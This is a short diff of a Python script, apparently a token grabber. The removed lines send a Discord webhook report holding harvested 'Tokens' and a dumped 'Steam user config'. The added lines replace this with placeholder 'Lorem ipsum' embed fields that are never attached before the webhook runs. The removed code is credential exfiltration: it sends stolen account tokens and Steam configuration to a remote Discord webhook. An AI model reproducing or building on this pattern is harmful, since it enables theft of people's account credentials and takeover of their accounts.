@@ -118,11 +118,11 @@ class Main:
             r = webhook.execute()
 
         print("a")
-        report = DiscordEmbed(title="Report")
-        report.add_embed_field(name='Tokens', value='`'+str(token)+'`')
-        report.add_embed_field(name='Steam user config', value='```'+str(vdf.dumps(userConfig, True))+'```')
-        self.webhook.add_embed(report)
-        r = self.webhook.execute()
+        webhook = self.webhook
+        embed = DiscordEmbed(title='Your Title', description='Lorem ipsum dolor sit', color='03b2f8')
+        embed.add_embed_field(name='Field 1', value='Lorem ipsum')
+        embed.add_embed_field(name='Field 2', value='dolor sit')
+        r = webhook.execute()
 
 if __name__ == "__main__":
     Main().run()
